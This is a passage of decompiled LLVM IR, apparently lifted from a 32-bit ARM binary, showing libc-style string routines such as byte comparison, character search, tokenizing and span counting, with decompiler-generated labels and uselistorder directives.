  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 26, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32* %r2.global-to-local, { 0, 68, 1, 2, 3, 4, 5, 69, 6, 7, 8, 9, 10, 70, 11, 12, 66, 67, 71, 27, 13, 15, 14, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26, 28, 29, 61, 30, 31, 32, 33, 34, 62, 35, 36, 37, 38, 39, 63, 40, 41, 42, 43, 44, 64, 45, 46, 47, 49, 48, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 65 }
  uselistorder i32* %r1.global-to-local, { 3, 5, 2, 77, 4, 6, 8, 10, 7, 78, 9, 11, 13, 75, 12, 79, 74, 76, 80, 83, 81, 87, 88, 14, 15, 16, 18, 17, 19, 20, 82, 21, 22, 84, 23, 85, 24, 86, 25, 26, 27, 28, 29, 31, 33, 30, 45, 32, 34, 36, 38, 35, 46, 37, 39, 41, 43, 40, 47, 42, 44, 48, 49, 54, 50, 52, 51, 53, 55, 58, 56, 59, 57, 60, 61, 67, 62, 63, 68, 64, 69, 65, 70, 66, 71, 72, 73, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 56, 3, 4, 57, 5, 6, 58, 7, 55, 61, 62, 8, 9, 21, 10, 12, 11, 13, 14, 59, 15, 16, 60, 17, 18, 19, 20, 22, 23, 31, 24, 25, 32, 26, 27, 33, 28, 29, 34, 30, 35, 36, 38, 37, 39, 40, 42, 41, 43, 44, 50, 51, 45, 46, 47, 52, 48, 49, 53, 54, 0, 1 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 35, 36, 37, 6, 7, 8, 9, 10, 11, 12, 13, 14, 23, 15, 16, 17, 24, 18, 19, 20, 25, 21, 22, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i1* %cpsr_z.global-to-local, { 45, 3, 46, 5, 47, 6, 4, 42, 43, 7, 8, 9, 10, 11, 12, 13, 14, 44, 15, 16, 17, 18, 19, 0, 20, 1, 21, 2, 23, 22, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i1* %cpsr_v.global-to-local, { 42, 4, 43, 6, 44, 7, 5, 41, 8, 9, 10, 11, 12, 13, 14, 15, 16, 1, 17, 18, 19, 0, 20, 2, 21, 3, 23, 22, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40 }
  uselistorder i1* %cpsr_n.global-to-local, { 48, 4, 49, 6, 50, 7, 5, 46, 47, 8, 9, 10, 11, 12, 13, 14, 15, 16, 1, 17, 18, 19, 20, 21, 0, 22, 2, 23, 3, 25, 24, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1 }
  uselistorder i32 -5, { 1, 0, 2 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder label %dec_label_pc_143f0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14384, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14318, { 2, 0, 1 }
  uselistorder label %dec_label_pc_142b8, { 1, 0 }
  uselistorder label %.thread13, { 2, 0, 1 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %bb150, { 4, 5, 6, 3, 7, 0, 1, 2 }
  uselistorder label %dec_label_pc_14244, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_14208, { 1, 0 }
  uselistorder label %dec_label_pc_141f4, { 1, 0 }
  uselistorder label %dec_label_pc_141b4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14148, { 2, 0, 1 }
  uselistorder label %dec_label_pc_140dc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1407c, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %dec_label_pc_1404c, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %bb140, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread114, { 1, 0 }
  uselistorder label %dec_label_pc_13fe8, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_13fa8, { 1, 0 }
}

define i32 @function_14410(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_14414.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_14410

dec_label_pc_14410:                               ; preds = %bb3, %bb
  %v0_14414 = phi i32 [ %v0_14414.pre, %bb ], [ %v5_14414, %bb3 ]
  %v0_14410 = phi i32 [ %tmp, %bb ], [ %v5_14410, %bb3 ]
  %v1_14410 = inttoptr i32 %v0_14410 to i8*
  %v2_14410 = load i8, i8* %v1_14410, align 1
  %v1_14414 = inttoptr i32 %v0_14414 to i8*
  %v2_14414 = load i8, i8* %v1_14414, align 1
  %v3_14414 = zext i8 %v2_14414 to i32
  %v2_14418 = icmp eq i8 %v2_14410, 0
  br i1 %v2_14418, label %.dec_label_pc_14424_crit_edge, label %bb3

bb3:                                              ; preds = %dec_label_pc_14410
  %v5_14414 = add i32 %v0_14414, 1
  %v5_14410 = add i32 %v0_14410, 1
  %v3_14410 = zext i8 %v2_14410 to i32
  %v10_1441c = icmp eq i8 %v2_14410, %v2_14414
  br i1 %v10_1441c, label %dec_label_pc_14410, label %dec_label_pc_14424

.dec_label_pc_14424_crit_edge:                    ; preds = %dec_label_pc_14410
  br label %dec_label_pc_14424

dec_label_pc_14424:                               ; preds = %bb3, %.dec_label_pc_14424_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_14424_crit_edge ], [ %v3_14410, %bb3 ]
  %v2_14424.pre-phi = sub nsw i32 %.pn, %v3_14414
  ret i32 %v2_14424.pre-phi

; uselistorder directives
  uselistorder i8 %v2_14410, { 0, 2, 1 }
  uselistorder i32 %v0_14410, { 1, 0 }
  uselistorder i32 %v0_14414, { 1, 0 }
  uselistorder label %dec_label_pc_14424, { 1, 0 }
}

define i32 @function_14430(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_14430:
  %v1_14434 = urem i32 %arg1, 256
  %v0_14450.pr = load i32, i32* @r2, align 4
  %v2_1445015 = icmp eq i32 %v0_14450.pr, 0
  %v0_14464.pre = load i32, i32* @r0, align 4
  br i1 %v2_1445015, label %dec_label_pc_14460, label %dec_label_pc_14458

dec_label_pc_1443c:                               ; preds = %dec_label_pc_14458
  %v1_1443c = inttoptr i32 %v0_1444c to i8*
  %v2_1443c = load i8, i8* %v1_1443c, align 1
  %v3_1443c = zext i8 %v2_1443c to i32
  %v9_14440 = icmp eq i32 %v3_1443c, %v1_14434
  br i1 %v9_14440, label %dec_label_pc_14510, label %dec_label_pc_14448

dec_label_pc_14448:                               ; preds = %dec_label_pc_1443c
  %v1_14448 = add i32 %v0_14448, -1
  %v1_1444c = add i32 %v0_1444c, 1
  %v2_14450 = icmp eq i32 %v1_14448, 0
  br i1 %v2_14450, label %dec_label_pc_14460, label %dec_label_pc_14458

dec_label_pc_14458:                               ; preds = %dec_label_pc_14430, %dec_label_pc_14448
  %v0_14448 = phi i32 [ %v1_14448, %dec_label_pc_14448 ], [ %v0_14450.pr, %dec_label_pc_14430 ]
  %v0_1444c = phi i32 [ %v1_1444c, %dec_label_pc_14448 ], [ %v0_14464.pre, %dec_label_pc_14430 ]
  %v1_14458 = urem i32 %v0_1444c, 4
  %v2_14458 = icmp eq i32 %v1_14458, 0
  br i1 %v2_14458, label %dec_label_pc_14460, label %dec_label_pc_1443c

dec_label_pc_14460:                               ; preds = %dec_label_pc_14448, %dec_label_pc_14458, %dec_label_pc_14430
  %v0_144dc22 = phi i32 [ 0, %dec_label_pc_14430 ], [ 0, %dec_label_pc_14448 ], [ %v0_14448, %dec_label_pc_14458 ]
  %v0_14464 = phi i32 [ %v0_14464.pre, %dec_label_pc_14430 ], [ %v1_1444c, %dec_label_pc_14448 ], [ %v0_1444c, %dec_label_pc_14458 ]
  %v4_14460 = mul nuw nsw i32 %v1_14434, 256
  %v5_14460 = or i32 %v4_14460, %v1_14434
  %v4_14468 = mul i32 %v5_14460, 65536
  %v5_14468 = or i32 %v4_14468, %v5_14460
  store i32 2130640639, i32* @ip, align 4
  %tmp = icmp ugt i32 %v0_144dc22, 3
  br i1 %tmp, label %dec_label_pc_14470, label %dec_label_pc_14504.preheader

dec_label_pc_14470:                               ; preds = %dec_label_pc_14460, %dec_label_pc_144dc.backedge
  %v0_1448c60 = phi i32 [ %v1_1448c, %dec_label_pc_144dc.backedge ], [ %v0_144dc22, %dec_label_pc_14460 ]
  %v0_144b059 = phi i32 [ %v4_14470, %dec_label_pc_144dc.backedge ], [ %v0_14464, %dec_label_pc_14460 ]
  %v1_14470 = inttoptr i32 %v0_144b059 to i32*
  %v2_14470 = load i32, i32* %v1_14470, align 4
  %v4_14470 = add i32 %v0_144b059, 4
  %v2_14474 = xor i32 %v2_14470, %v5_14468
  %v2_14478 = add i32 %v2_14474, 2130640639
  %v1_1447c = sub i32 -1, %v2_14474
  %v2_14480 = xor i32 %v2_14478, %v1_1447c
  %v2_14484 = and i32 %v2_14480, -2130640640
  %v2_14488 = icmp eq i32 %v2_14484, 0
  %v1_1448c = add i32 %v0_1448c60, -4
  br i1 %v2_14488, label %dec_label_pc_144dc.backedge, label %dec_label_pc_14494

dec_label_pc_144dc.backedge:                      ; preds = %dec_label_pc_14470, %dec_label_pc_144cc
  store i32 2130640639, i32* @ip, align 4
  %tmp73 = icmp ugt i32 %v1_1448c, 3
  br i1 %tmp73, label %dec_label_pc_14470, label %dec_label_pc_14504.preheader

dec_label_pc_14494:                               ; preds = %dec_label_pc_14470
  %v2_14494 = inttoptr i32 %v0_144b059 to i8*
  %v3_14494 = load i8, i8* %v2_14494, align 1
  %v4_14494 = zext i8 %v3_14494 to i32
  %v9_1449c = icmp eq i32 %v4_14494, %v1_14434
  %v1_144a0 = add i32 %v0_144b059, 3
  store i32 %v1_144a0, i32* @ip, align 4
  br i1 %v9_1449c, label %dec_label_pc_14510, label %dec_label_pc_144a8

dec_label_pc_144a8:                               ; preds = %dec_label_pc_14494
  %v1_144a8 = add i32 %v0_144b059, 1
  %v2_144a8 = inttoptr i32 %v1_144a8 to i8*
  %v3_144a8 = load i8, i8* %v2_144a8, align 1
  %v4_144a8 = zext i8 %v3_144a8 to i32
  %v9_144ac = icmp eq i32 %v4_144a8, %v1_14434
  br i1 %v9_144ac, label %bb, label %dec_label_pc_144bc

bb:                                               ; preds = %dec_label_pc_144a8
  br label %dec_label_pc_14510

dec_label_pc_144bc:                               ; preds = %dec_label_pc_144a8
  %v1_144bc = add i32 %v0_144b059, 2
  %v2_144bc = inttoptr i32 %v1_144bc to i8*
  %v3_144bc = load i8, i8* %v2_144bc, align 1
  %v4_144bc = zext i8 %v3_144bc to i32
  %v9_144c0 = icmp eq i32 %v4_144bc, %v1_14434
  br i1 %v9_144c0, label %dec_label_pc_14510, label %dec_label_pc_144cc

dec_label_pc_144cc:                               ; preds = %dec_label_pc_144bc
  %v2_144cc = inttoptr i32 %v1_144a0 to i8*
  %v3_144cc = load i8, i8* %v2_144cc, align 1
  %v4_144cc = zext i8 %v3_144cc to i32
  %v9_144d0 = icmp eq i32 %v4_144cc, %v1_14434
  br i1 %v9_144d0, label %bb36, label %dec_label_pc_144dc.backedge

bb36:                                             ; preds = %dec_label_pc_144cc
  br label %dec_label_pc_14510

dec_label_pc_14504.preheader:                     ; preds = %dec_label_pc_144dc.backedge, %dec_label_pc_14460
  %v0_144b0.lcssa = phi i32 [ %v0_14464, %dec_label_pc_14460 ], [ %v4_14470, %dec_label_pc_144dc.backedge ]
  %v0_1448c.lcssa = phi i32 [ %v0_144dc22, %dec_label_pc_14460 ], [ %v1_1448c, %dec_label_pc_144dc.backedge ]
  %v2_145047 = icmp eq i32 %v0_1448c.lcssa, 0
  br i1 %v2_145047, label %dec_label_pc_1450c, label %dec_label_pc_144f4

dec_label_pc_144f4:                               ; preds = %dec_label_pc_14500, %dec_label_pc_14504.preheader
  %v0_14504.in = phi i32 [ %v0_14504, %dec_label_pc_14500 ], [ %v0_1448c.lcssa, %dec_label_pc_14504.preheader ]
  %v0_14500 = phi i32 [ %v1_14500, %dec_label_pc_14500 ], [ %v0_144b0.lcssa, %dec_label_pc_14504.preheader ]
  %v0_14504 = add i32 %v0_14504.in, -1
  %v1_144f4 = inttoptr i32 %v0_14500 to i8*
  %v2_144f4 = load i8, i8* %v1_144f4, align 1
  %v3_144f4 = zext i8 %v2_144f4 to i32
  %v9_144f8 = icmp eq i32 %v3_144f4, %v1_14434
  br i1 %v9_144f8, label %dec_label_pc_14510, label %dec_label_pc_14500

dec_label_pc_14500:                               ; preds = %dec_label_pc_144f4
  %v1_14500 = add i32 %v0_14500, 1
  %v2_14504 = icmp eq i32 %v0_14504, 0
  br i1 %v2_14504, label %dec_label_pc_1450c, label %dec_label_pc_144f4

dec_label_pc_1450c:                               ; preds = %dec_label_pc_14500, %dec_label_pc_14504.preheader
  br label %dec_label_pc_14510

dec_label_pc_14510:                               ; preds = %dec_label_pc_1443c, %dec_label_pc_144bc, %dec_label_pc_14494, %dec_label_pc_144f4, %bb36, %bb, %dec_label_pc_1450c
  %v1_14514 = phi i32 [ 0, %dec_label_pc_1450c ], [ %v1_144a8, %bb ], [ %v1_144a0, %bb36 ], [ %v0_14500, %dec_label_pc_144f4 ], [ %v1_144bc, %dec_label_pc_144bc ], [ %v0_144b059, %dec_label_pc_14494 ], [ %v0_1444c, %dec_label_pc_1443c ]
  ret i32 %v1_14514

; uselistorder directives
  uselistorder i32 %v1_1448c, { 1, 0, 2 }
  uselistorder i32 %v0_144b059, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v5_14460, { 1, 0 }
  uselistorder i32 %v0_144dc22, { 1, 2, 0 }
  uselistorder i32 %v0_1444c, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_14464.pre, { 1, 0 }
  uselistorder i32 %v1_14434, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder label %dec_label_pc_14510, { 6, 3, 4, 1, 5, 2, 0 }
  uselistorder label %dec_label_pc_144dc.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_14470, { 1, 0 }
  uselistorder label %dec_label_pc_14460, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14458, { 1, 0 }
}

define i32 @function_14520() local_unnamed_addr {
dec_label_pc_14520:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_14520 = load i32, i32* @r4, align 4
  store i32 %v3_14520, i32* %stack_var_-16, align 4
  %v0_14524 = load i32, i32* @r0, align 4
  store i32 %v0_14524, i32* %r4.global-to-local, align 4
  %v2_14524 = icmp eq i32 %v0_14524, 0
  %v1_14528 = load i32, i32* @r2, align 4
  br i1 %v2_14524, label %bb, label %dec_label_pc_14520._crit_edge

bb:                                               ; preds = %dec_label_pc_14520
  %v2_14528 = inttoptr i32 %v1_14528 to i32*
  %v3_14528 = load i32, i32* %v2_14528, align 4
  store i32 %v3_14528, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14520._crit_edge

dec_label_pc_14520._crit_edge:                    ; preds = %dec_label_pc_14520, %bb
  %v0_1452c = phi i32 [ %v3_14528, %bb ], [ %v0_14524, %dec_label_pc_14520 ]
  store i32 %v0_1452c, i32* @r0, align 4
  store i32 %v1_14528, i32* %r5.global-to-local, align 4
  %v0_14534 = load i32, i32* @r1, align 4
  store i32 %v0_14534, i32* %r6.global-to-local, align 4
  %v1_14538 = inttoptr i32 %v0_1452c to i8*
  %v2_14538 = call i32 @function_1476c(i8* %v1_14538)
  %v0_1453c = load i32, i32* %r4.global-to-local, align 4
  %v2_1453c = add i32 %v0_1453c, %v2_14538
  %v3_1453c = inttoptr i32 %v2_1453c to i8*
  %v4_1453c = load i8, i8* %v3_1453c, align 1
  %v6_1453c = zext i8 %v4_1453c to i32
  store i32 %v6_1453c, i32* %r3.global-to-local, align 4
  store i32 %v2_1453c, i32* @r4, align 4
  %v2_14544 = icmp eq i8 %v4_1453c, 0
  br i1 %v2_14544, label %bb8, label %dec_label_pc_14550

bb8:                                              ; preds = %dec_label_pc_14520._crit_edge
  %v2_14548 = load i32, i32* %r5.global-to-local, align 4
  %v3_14548 = inttoptr i32 %v2_14548 to i32*
  store i32 %v2_1453c, i32* %v3_14548, align 4
  br label %dec_label_pc_1458c

dec_label_pc_14550:                               ; preds = %dec_label_pc_14520._crit_edge
  %v0_14550 = load i32, i32* %r6.global-to-local, align 4
  %v3_14558 = call i32 @function_14a08(i8* %v3_1453c, i32 %v0_14550)
  %v3_1455c = icmp eq i32 %v3_14558, 0
  br i1 %v3_1455c, label %dec_label_pc_14564, label %dec_label_pc_1457c

dec_label_pc_14564:                               ; preds = %dec_label_pc_14550
  %v0_14568 = load i32, i32* @r4, align 4
  store i32 %v0_14568, i32* @r0, align 4
  %v2_1456c = call i32 @function_145dc(i32 %v0_14568, i32 0)
  %v0_14570 = load i32, i32* @r4, align 4
  store i32 %v0_14570, i32* %r3.global-to-local, align 4
  %v1_14574 = load i32, i32* %r5.global-to-local, align 4
  %v2_14574 = inttoptr i32 %v1_14574 to i32*
  store i32 %v2_1456c, i32* %v2_14574, align 4
  br label %dec_label_pc_1458c

dec_label_pc_1457c:                               ; preds = %dec_label_pc_14550
  %v4_14558 = inttoptr i32 %v3_14558 to i8*
  store i8 0, i8* %v4_14558, align 1
  %v7_14580 = add i32 %v3_14558, 1
  %v1_14584 = load i32, i32* %r5.global-to-local, align 4
  %v2_14584 = inttoptr i32 %v1_14584 to i32*
  store i32 %v7_14580, i32* %v2_14584, align 4
  %v0_14588 = load i32, i32* @r4, align 4
  store i32 %v0_14588, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1458c

dec_label_pc_1458c:                               ; preds = %bb8, %dec_label_pc_14564, %dec_label_pc_1457c
  %v0_1458c = load i32, i32* %r3.global-to-local, align 4
  %v2_14590 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14590, i32* @r4, align 4
  ret i32 %v0_1458c

; uselistorder directives
  uselistorder i32 %v3_14558, { 0, 2, 1 }
  uselistorder i32 %v0_1452c, { 1, 0 }
  uselistorder i32 %v0_14524, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1458c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14520._crit_edge, { 1, 0 }
}

define i32 @function_14598() local_unnamed_addr {
dec_label_pc_14598:
  %stack_var_-16 = alloca i32, align 4
  %v3_14598 = load i32, i32* @r4, align 4
  store i32 %v3_14598, i32* %stack_var_-16, align 4
  %v6_14598 = load i32, i32* @r5, align 4
  %v9_14598 = load i32, i32* @r6, align 4
  %v0_1459c = load i32, i32* @r0, align 4
  %v0_145a0 = load i32, i32* @r1, align 4
  store i32 %v0_145a0, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_145bc8 = inttoptr i32 %v0_1459c to i8*
  %v2_145bc9 = load i8, i8* %v1_145bc8, align 1
  %v2_145c011 = icmp eq i8 %v2_145bc9, 0
  store i32 %v0_145a0, i32* @r0, align 4
  %v1_145c812 = add i32 %v0_1459c, 1
  store i32 %v1_145c812, i32* @r4, align 4
  br i1 %v2_145c011, label %dec_label_pc_145d0, label %dec_label_pc_145ac

dec_label_pc_145ac:                               ; preds = %dec_label_pc_14598, %dec_label_pc_145b8
  %v3_145bc14.in = phi i8 [ %v2_145bc, %dec_label_pc_145b8 ], [ %v2_145bc9, %dec_label_pc_14598 ]
  %v0_145c413 = phi i32 [ %v0_145c4.pre, %dec_label_pc_145b8 ], [ %v0_145a0, %dec_label_pc_14598 ]
  %v3_145bc14 = zext i8 %v3_145bc14.in to i32
  %v2_145ac = call i32 @function_14918(i32 %v0_145c413, i32 %v3_145bc14)
  %v2_145b0 = icmp eq i32 %v2_145ac, 0
  %v0_145b8 = load i32, i32* @r5, align 4
  br i1 %v2_145b0, label %dec_label_pc_145b8, label %dec_label_pc_145d0

dec_label_pc_145b8:                               ; preds = %dec_label_pc_145ac
  %v1_145b8 = add i32 %v0_145b8, 1
  %v0_145bc.pre = load i32, i32* @r4, align 4
  %v0_145c4.pre = load i32, i32* @r6, align 4
  store i32 %v1_145b8, i32* @r5, align 4
  %v1_145bc = inttoptr i32 %v0_145bc.pre to i8*
  %v2_145bc = load i8, i8* %v1_145bc, align 1
  %v2_145c0 = icmp eq i8 %v2_145bc, 0
  store i32 %v0_145c4.pre, i32* @r0, align 4
  %v1_145c8 = add i32 %v0_145bc.pre, 1
  store i32 %v1_145c8, i32* @r4, align 4
  br i1 %v2_145c0, label %dec_label_pc_145d0, label %dec_label_pc_145ac

dec_label_pc_145d0:                               ; preds = %dec_label_pc_145b8, %dec_label_pc_145ac, %dec_label_pc_14598
  %v0_145d0 = phi i32 [ 0, %dec_label_pc_14598 ], [ %v0_145b8, %dec_label_pc_145ac ], [ %v1_145b8, %dec_label_pc_145b8 ]
  %v2_145d4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_145d4, i32* @r4, align 4
  store i32 %v6_14598, i32* @r5, align 4
  store i32 %v9_14598, i32* @r6, align 4
  ret i32 %v0_145d0

; uselistorder directives
  uselistorder i8 %v2_145bc, { 1, 0 }
  uselistorder i32 %v0_145c4.pre, { 1, 0 }
  uselistorder i32 %v0_145bc.pre, { 1, 0 }
  uselistorder label %dec_label_pc_145ac, { 1, 0 }
}

define i32 @function_145dc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_145dc:
  %v1_145e0 = urem i32 %arg1, 256
  %v0_145f82 = load i32, i32* @r0, align 4
  %v1_145f83 = urem i32 %v0_145f82, 4
  %v2_145f84 = icmp eq i32 %v1_145f83, 0
  br i1 %v2_145f84, label %dec_label_pc_14600, label %dec_label_pc_145e8

dec_label_pc_145e8:                               ; preds = %dec_label_pc_145dc, %dec_label_pc_145f4
  %v0_145f4 = phi i32 [ %v1_145f4, %dec_label_pc_145f4 ], [ %v0_145f82, %dec_label_pc_145dc ]
  %v1_145e8 = inttoptr i32 %v0_145f4 to i8*
  %v2_145e8 = load i8, i8* %v1_145e8, align 1
  %v3_145e8 = zext i8 %v2_145e8 to i32
  %v9_145ec = icmp eq i32 %v3_145e8, %v1_145e0
  br i1 %v9_145ec, label %dec_label_pc_1467c, label %dec_label_pc_145f4

dec_label_pc_145f4:                               ; preds = %dec_label_pc_145e8
  %v1_145f4 = add i32 %v0_145f4, 1
  %v1_145f8 = urem i32 %v1_145f4, 4
  %v2_145f8 = icmp eq i32 %v1_145f8, 0
  br i1 %v2_145f8, label %dec_label_pc_14600, label %dec_label_pc_145e8

dec_label_pc_14600:                               ; preds = %dec_label_pc_145f4, %dec_label_pc_145dc
  %v0_14604 = phi i32 [ %v0_145f82, %dec_label_pc_145dc ], [ %v1_145f4, %dec_label_pc_145f4 ]
  %v4_14600 = mul nuw nsw i32 %v1_145e0, 256
  %v5_14600 = or i32 %v4_14600, %v1_145e0
  %v4_14608 = mul i32 %v5_14600, 65536
  %v5_14608 = or i32 %v4_14608, %v5_14600
  br label %dec_label_pc_1460c

dec_label_pc_1460c:                               ; preds = %dec_label_pc_1466c, %dec_label_pc_1460c, %dec_label_pc_14600
  %v0_14650 = phi i32 [ %v0_14604, %dec_label_pc_14600 ], [ %v4_1460c, %dec_label_pc_1460c ], [ %v4_1460c, %dec_label_pc_1466c ]
  %v1_1460c = inttoptr i32 %v0_14650 to i32*
  %v2_1460c = load i32, i32* %v1_1460c, align 4
  %v4_1460c = add i32 %v0_14650, 4
  %v2_14614 = xor i32 %v2_1460c, %v5_14608
  %v2_14618 = add i32 %v2_14614, 2130640639
  %v1_14620 = sub i32 -1, %v2_14614
  %v2_14624 = xor i32 %v2_14618, %v1_14620
  %v2_14628 = and i32 %v2_14624, -2130640640
  %v2_1462c = icmp eq i32 %v2_14628, 0
  br i1 %v2_1462c, label %dec_label_pc_1460c, label %dec_label_pc_14634

dec_label_pc_14634:                               ; preds = %dec_label_pc_1460c
  %v2_14634 = inttoptr i32 %v0_14650 to i8*
  %v3_14634 = load i8, i8* %v2_14634, align 1
  %v4_14634 = zext i8 %v3_14634 to i32
  %v9_1463c = icmp eq i32 %v4_14634, %v1_145e0
  %v1_14640 = add i32 %v0_14650, 3
  br i1 %v9_1463c, label %dec_label_pc_1467c, label %dec_label_pc_14648

dec_label_pc_14648:                               ; preds = %dec_label_pc_14634
  %v1_14648 = add i32 %v0_14650, 1
  %v2_14648 = inttoptr i32 %v1_14648 to i8*
  %v3_14648 = load i8, i8* %v2_14648, align 1
  %v4_14648 = zext i8 %v3_14648 to i32
  %v9_1464c = icmp eq i32 %v4_14648, %v1_145e0
  br i1 %v9_1464c, label %bb, label %dec_label_pc_1465c

bb:                                               ; preds = %dec_label_pc_14648
  br label %dec_label_pc_1467c

dec_label_pc_1465c:                               ; preds = %dec_label_pc_14648
  %v1_1465c = add i32 %v0_14650, 2
  %v2_1465c = inttoptr i32 %v1_1465c to i8*
  %v3_1465c = load i8, i8* %v2_1465c, align 1
  %v4_1465c = zext i8 %v3_1465c to i32
  %v9_14660 = icmp eq i32 %v4_1465c, %v1_145e0
  br i1 %v9_14660, label %dec_label_pc_1467c, label %dec_label_pc_1466c

dec_label_pc_1466c:                               ; preds = %dec_label_pc_1465c
  %v2_1466c = inttoptr i32 %v1_14640 to i8*
  %v3_1466c = load i8, i8* %v2_1466c, align 1
  %v4_1466c = zext i8 %v3_1466c to i32
  %v9_14670 = icmp eq i32 %v4_1466c, %v1_145e0
  br i1 %v9_14670, label %dec_label_pc_14678, label %dec_label_pc_1460c

dec_label_pc_14678:                               ; preds = %dec_label_pc_1466c
  br label %dec_label_pc_1467c

dec_label_pc_1467c:                               ; preds = %dec_label_pc_145e8, %dec_label_pc_1465c, %dec_label_pc_14634, %bb, %dec_label_pc_14678
  %v1_14680 = phi i32 [ %v1_14640, %dec_label_pc_14678 ], [ %v1_14648, %bb ], [ %v1_1465c, %dec_label_pc_1465c ], [ %v0_14650, %dec_label_pc_14634 ], [ %v0_145f4, %dec_label_pc_145e8 ]
  ret i32 %v1_14680

; uselistorder directives
  uselistorder i32 %v4_1460c, { 1, 0 }
  uselistorder i32 %v0_14650, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_14600, { 1, 0 }
  uselistorder i32 %v1_145f4, { 1, 0, 2 }
  uselistorder i32 %v0_145f82, { 2, 1, 0 }
  uselistorder i32 %v1_145e0, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_1467c, { 4, 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_145e8, { 1, 0 }
}

define i32 @function_1468c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1468c:
  %v1_14690 = urem i32 %arg2, 256
  %v2_14694 = add i32 %arg3, %arg1
  %v2_146ac4 = icmp eq i32 %arg3, 0
  br i1 %v2_146ac4, label %dec_label_pc_146bc, label %dec_label_pc_146b4

dec_label_pc_1469c:                               ; preds = %dec_label_pc_146b4
  %v1_1469c = add i32 %v0_1469c, -1
  %v2_1469c = inttoptr i32 %v1_1469c to i8*
  %v3_1469c = load i8, i8* %v2_1469c, align 1
  %v4_1469c = zext i8 %v3_1469c to i32
  %v9_146a0 = icmp eq i32 %v4_1469c, %v1_14690
  br i1 %v9_146a0, label %dec_label_pc_1475c, label %dec_label_pc_146a8

dec_label_pc_146a8:                               ; preds = %dec_label_pc_1469c
  %v1_146a8 = add i32 %v0_146a8, -1
  %v2_146ac = icmp eq i32 %v1_146a8, 0
  br i1 %v2_146ac, label %dec_label_pc_146bc, label %dec_label_pc_146b4

dec_label_pc_146b4:                               ; preds = %dec_label_pc_1468c, %dec_label_pc_146a8
  %v0_146a8 = phi i32 [ %v1_146a8, %dec_label_pc_146a8 ], [ %arg3, %dec_label_pc_1468c ]
  %v0_1469c = phi i32 [ %v1_1469c, %dec_label_pc_146a8 ], [ %v2_14694, %dec_label_pc_1468c ]
  %v1_146b4 = urem i32 %v0_1469c, 4
  %v2_146b4 = icmp eq i32 %v1_146b4, 0
  br i1 %v2_146b4, label %dec_label_pc_146bc, label %dec_label_pc_1469c

dec_label_pc_146bc:                               ; preds = %dec_label_pc_146a8, %dec_label_pc_146b4, %dec_label_pc_1468c
  %v0_1474413 = phi i32 [ %v2_14694, %dec_label_pc_1468c ], [ %v1_1469c, %dec_label_pc_146a8 ], [ %v0_1469c, %dec_label_pc_146b4 ]
  %v0_147309 = phi i32 [ 0, %dec_label_pc_1468c ], [ 0, %dec_label_pc_146a8 ], [ %v0_146a8, %dec_label_pc_146b4 ]
  %v4_146bc = mul nuw nsw i32 %v1_14690, 256
  %v5_146bc = or i32 %v4_146bc, %v1_14690
  %v4_146c0 = mul i32 %v5_146bc, 65536
  %v5_146c0 = or i32 %v4_146c0, %v5_146bc
  store i32 2130640639, i32* @ip, align 4
  %tmp = icmp ugt i32 %v0_147309, 3
